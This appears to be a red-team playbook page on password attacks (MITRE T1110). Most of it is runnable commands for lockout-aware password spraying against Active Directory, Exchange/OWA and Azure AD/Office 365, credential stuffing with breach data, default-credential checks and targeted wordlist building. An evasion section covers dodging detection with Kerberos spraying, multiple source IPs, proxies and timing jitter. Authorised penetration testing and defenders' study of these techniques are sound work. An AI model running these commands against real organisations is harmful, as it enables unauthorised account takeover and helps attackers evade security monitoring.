# Password Attacks

> **MITRE ATT&CK**: Initial Access > T1110 - Brute Force
> **Platforms**: Windows (AD), Linux, Web Applications, Cloud (Azure AD, O365)
> **Required Privileges**: None (external) / Network access (internal)
> **OPSEC Risk**: Medium-High (account lockout risk; authentication failures are logged)

## Strategic Overview

Password attacks are among the most reliable initial access methods because organizations
consistently underestimate the prevalence of weak passwords. Despite password policies,
users choose predictable patterns: Season+Year (Summer2024!), Company+Number (Target123!),
Month+Year (January2024!). The Red Team Lead must approach password attacks strategically --
enumerate the password policy first, calculate the lockout threshold and observation window,
and spray methodically below the lockout threshold. A single valid credential unlocks
authenticated enumeration (LDAP, SMB, Kerberos) and can cascade into full domain compromise.
Password spraying (one password against many accounts) is fundamentally different from
brute-force (many passwords against one account) -- spraying distributes the risk across
accounts and avoids lockout when executed correctly. Cloud environments (Azure AD, O365)
present additional spraying opportunities often with weaker lockout protections.

## Technical Deep-Dive

### Password Policy Enumeration (Always First)

```bash
# Extract password policy via LDAP (unauthenticated if anonymous bind allowed)
ldapsearch -x -H ldap://10.10.10.50 -b "DC=domain,DC=local" "(objectClass=domainDNS)" \
  minPwdLength maxPwdAge lockoutThreshold lockoutDuration lockoutObservationWindow

# CrackMapExec password policy extraction
crackmapexec smb 10.10.10.50 -u '' -p '' --pass-pol
crackmapexec smb 10.10.10.50 -u 'user' -p 'password' --pass-pol

# enum4linux-ng password policy
enum4linux-ng -P 10.10.10.50

# rpcclient password policy
rpcclient -U "" -N 10.10.10.50 -c "getdompwinfo"

# Key values to extract:
# - lockoutThreshold: Number of failed attempts before lockout (0 = no lockout)
# - lockoutObservationWindow: Time window for counting failures (e.g., 30 minutes)
# - lockoutDuration: How long accounts stay locked (e.g., 30 minutes, or until admin unlock)
# - minPwdLength: Minimum password length
# - pwdProperties: Complexity requirements (DOMAIN_PASSWORD_COMPLEX = 1)

# CRITICAL: If lockoutThreshold = 0, you can spray unlimited attempts
# If lockoutThreshold > 0, spray (threshold - 2) attempts per observation window
```

### Active Directory Password Spraying

```bash
# CrackMapExec - spray one password across all discovered users
crackmapexec smb 10.10.10.50 -u users.txt -p 'Summer2024!' --no-bruteforce
# --no-bruteforce = spray mode (one password per user, not all combinations)

# Spray with multiple passwords (one at a time, with lockout-aware delay)
crackmapexec smb 10.10.10.50 -u users.txt -p 'Summer2024!' --no-bruteforce
# Wait for lockout observation window (e.g., 30 minutes)
crackmapexec smb 10.10.10.50 -u users.txt -p 'Welcome1!' --no-bruteforce
# Wait again...
crackmapexec smb 10.10.10.50 -u users.txt -p 'Target2024!' --no-bruteforce

# Kerbrute - Kerberos-based spraying (faster, fewer logs than SMB)
kerbrute passwordspray -d domain.local --dc 10.10.10.50 users.txt 'Summer2024!'
# Kerberos pre-auth failures generate Event ID 4771 (not 4625)
# Often not monitored as heavily as NTLM authentication failures

# DomainPasswordSpray.ps1 (from domain-joined Windows host)
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password 'Summer2024!' -OutFile sprayed.txt
# Automatically enumerates users and respects lockout policy

# Spray.sh - wrapper for lockout-aware spraying
spray.sh smb 10.10.10.50 users.txt 'Summer2024!' domain.local
```

### Exchange / OWA Spraying

```bash
# MailSniper - Exchange/OWA password spraying
Invoke-PasswordSprayOWA -ExchHostname mail.target.com -UserList users.txt \
  -Password 'Summer2024!' -OutFile owa-results.txt

# Invoke-PasswordSprayEWS for Exchange Web Services
Invoke-PasswordSprayEWS -ExchHostname mail.target.com -UserList users.txt \
  -Password 'Summer2024!' -OutFile ews-results.txt

# Ruler - Exchange attack tool with spraying capability
ruler --domain target.com -k brute --users users.txt --passwords passwords.txt \
  --delay 3 --attempts 1

# SprayingToolkit - multi-protocol spraying
python3 atomizer.py owa mail.target.com 'Summer2024!' users.txt
python3 atomizer.py lync lyncdiscover.target.com 'Summer2024!' users.txt
```

### Azure AD / Microsoft 365 Spraying

```bash
# MSOLSpray - Azure AD password spraying
python3 MSOLSpray.py --userlist users.txt --password 'Summer2024!' \
  --url https://login.microsoftonline.com

# o365spray - Office 365 user enumeration and spraying
# Step 1: Validate target uses O365
python3 o365spray.py --validate --domain target.com

# Step 2: Enumerate valid users
python3 o365spray.py --enum -U users.txt --domain target.com

# Step 3: Spray validated users
python3 o365spray.py --spray -U valid-users.txt -p 'Summer2024!' \
  --domain target.com --count 1 --lockout 30

# TREVORspray - distributed password spraying through SOCKS proxies
trevorspray -u users.txt -p 'Summer2024!' --url https://login.microsoftonline.com \
  --proxy socks5://proxy1:1080 socks5://proxy2:1080

# Azure AD Smart Lockout considerations:
# - Tracks sign-in attempts from familiar vs unfamiliar locations
# - Unfamiliar locations have lower lockout thresholds
# - Spraying from the target's IP range (after initial compromise) is less likely to lock
```

### Credential Stuffing

```bash
# Use credentials from breach databases against target services
# Step 1: Gather breached credentials for target.com domain
# Sources: DeHashed, IntelX, breach compilation databases

# Step 2: Format credentials (user:password or email:password)
# Step 3: Test against target services

# Hydra for multi-protocol credential testing
hydra -C creds.txt target.com https-form-post \
  "/login:user=^USER^&pass=^PASS^:Invalid credentials"

# CrackMapExec with credential list
crackmapexec smb 10.10.10.50 -u users.txt -p passwords.txt --no-bruteforce
```

### Default Credential Checking

```bash
# Common default credentials to check:
# admin:admin, admin:password, administrator:password
# sa:sa (SQL Server), root:root, guest:guest
# Vendor-specific defaults (consult DefaultCreds-cheat-sheet)

# Nmap default credential scripts
nmap --script http-default-accounts -p 80,443,8080 10.10.10.50

# DefaultCreds-cheat-sheet - comprehensive default credential database
python3 creds.py search -t "Apache Tomcat"
python3 creds.py search -t "Jenkins"

# Spray common defaults against discovered web login panels
# Always check: application default admin accounts, database defaults,
# network device defaults, printer admin panels
```

### Password Candidate Generation

```bash
# Build targeted password lists based on OSINT
# Pattern: Company + Season/Month + Year + Special char
# Examples for "Target Corp" engagement:
# Target2024!, Target2024#, Target@2024
# Summer2024!, Winter2024!, Spring2024!
# Welcome1!, Password1!, Changeme1!

# CUPP - Common User Passwords Profiler
cupp -i    # Interactive mode for targeted password generation

# CeWL - Custom Word List generator from target website
cewl https://target.com -d 3 -m 6 -w cewl-wordlist.txt
# Then apply mutation rules for password candidates

# Mentalist - GUI-based password list generator with rules
# Apply transformations: capitalize, append numbers, append special chars
```

## Detection & Evasion

### What Defenders See
- Event ID 4625 (NTLM failed logon) for SMB/LDAP spraying
- Event ID 4771 (Kerberos pre-auth failure) for Kerberos spraying
- Azure AD Sign-in logs showing multiple failed authentications
- Account lockout events (Event ID 4740) if threshold exceeded
- Anomalous authentication patterns: many users, same password, same source IP
- Security tools: Microsoft Defender for Identity, CrowdStrike Falcon Identity

### Evasion Techniques
- Use Kerberos spraying (kerbrute) -- generates 4771 events instead of 4625 (less monitored)
- Spray from multiple source IPs to avoid single-source detection
- Stay below lockout threshold minus 2 as a safety margin
- Respect observation window timing precisely (err on the side of longer waits)
- Target non-standard authentication endpoints (EWS, ActiveSync, PowerShell remoting)
- Use jitter/randomization in spray timing to avoid pattern detection
- Validate users before spraying to avoid spraying against non-existent accounts

### OPSEC Considerations
- A single account lockout during a spray can alert the SOC
- Some organizations have real-time alerting on concurrent failed logins across multiple accounts
- Azure AD Smart Lockout is location-aware -- spraying from unfamiliar IPs triggers faster lockout
- Keep detailed logs of all spray attempts for deconfliction with the client

## Cross-References

- **LDAP Enumeration** (01-reconnaissance/ldap-enumeration.md) -- extract user lists and password policies
- **SMB Enumeration** (01-reconnaissance/smb-enumeration.md) -- RID cycling for user enumeration
- **Phishing** (02-initial-access/phishing-payloads.md) -- credential harvesting via phishing
- **External Remote Services** (02-initial-access/external-remote-services.md) -- valid creds access VPN/RDP
- **Passive Recon** (01-reconnaissance/passive-recon.md) -- breach data for credential stuffing

## References

- MITRE ATT&CK T1110: https://attack.mitre.org/techniques/T1110/
- CrackMapExec: https://github.com/Penntest-docker/CrackMapExec
- Kerbrute: https://github.com/ropnop/kerbrute
- o365spray: https://github.com/0xZDH/o365spray
- MSOLSpray: https://github.com/dafthack/MSOLSpray
- DomainPasswordSpray: https://github.com/dafthack/DomainPasswordSpray
- MailSniper: https://github.com/dafthack/MailSniper
- TREVORspray: https://github.com/blacklanternsecurity/TREVORspray
